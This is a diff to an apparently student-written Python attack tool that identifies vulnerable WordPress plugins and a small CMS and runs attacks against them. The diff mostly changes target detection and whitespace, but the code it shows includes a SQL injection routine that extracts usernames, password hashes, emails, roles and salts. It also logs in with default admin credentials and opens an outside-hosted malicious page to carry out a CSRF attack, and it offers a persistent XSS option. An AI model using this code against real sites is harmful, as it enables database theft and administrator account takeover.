@@ -25,6 +25,8 @@ while exit != "y":
     page = browser.response().read()
     soupParser = BeautifulSoup(page, "html.parser")
 
+    chaineddivs = soupParser.findAll("div", {"class": "chained-quiz"})
+
     #IDENTIFICATION OF THE TARGET
     target=0
 
@@ -33,8 +35,9 @@ while exit != "y":
         target = 2
 
     #Is it wordpress chained quiz?
-    elif 'quizexploit' in browser.title() :
+    elif (len(chaineddivs) > 0) :
         target = 3
+
     else:
         title = ""
         try:
@@ -43,11 +46,11 @@ while exit != "y":
             title = browser.title()
         except:
             title = None
-            
+
         #Is it Simple WordPress Membership?
         if title and "Member Login" in  title:
             print("This has the Simple Membership plugin")
-            target = 4 
+            target = 4
         else:
             #Is it Victor Alagwu's Simple CMS?
             comments = soupParser.findAll(string=lambda text: isinstance(text, Comment))
@@ -73,7 +76,7 @@ while exit != "y":
             print('2. Persistent XSS')
             print()
             attack = input("Attack: ")
-            
+
             if attack == '1':
                 #get users, MySQL version and database name of the website
                 #some of this parameters are not shown in the page, but can are retrieved from the database anyway
@@ -95,8 +98,8 @@ while exit != "y":
                     x = re.search("<h2><a href=\"post\.php\?post=([0-9]+)\">(.+)<\/a><\/h2>", str(user))
                     users.append({'user_id': x.group(1), 'user_name': x.group(2), 'password': passwords[i], 'mail': mail[i]['src'][4:], 'role':roles[i], 'randsalt': re.search("<a href=\"#\">(.+)<\/a>", str(randsalts[i])).group(1)})
                     i = i + 1
-                    
-                    
+
+
                 print()
                 print("Users:")
                 print()
@@ -104,7 +107,7 @@ while exit != "y":
                 for user in users:
                     print(user)
                     print()
-                    
+
                 print()
                 print()
                 #authors = soupParser.findAll("h3")
@@ -197,18 +200,18 @@ while exit != "y":
             browser["log"] = "admin"
             browser["pwd"] = "password"
 
-            logged_in = browser.submit() 
+            logged_in = browser.submit()
             logincheck = logged_in.read()
 
             print(logged_in.code)
             print(logged_in.info())
             print()
-            
+
             #open malicious html page
             browser.open("http://javariati.tk/matteo/InfoSec/CSRF.html")
-            
+
             browser.select_form(nr = 0)
-            browser.submit() 
+            browser.submit()
             #form is automatically submitted
 
             print("visit " + url + "wp-admin/admin.php?page=simple_wp_membership to see the modifications")
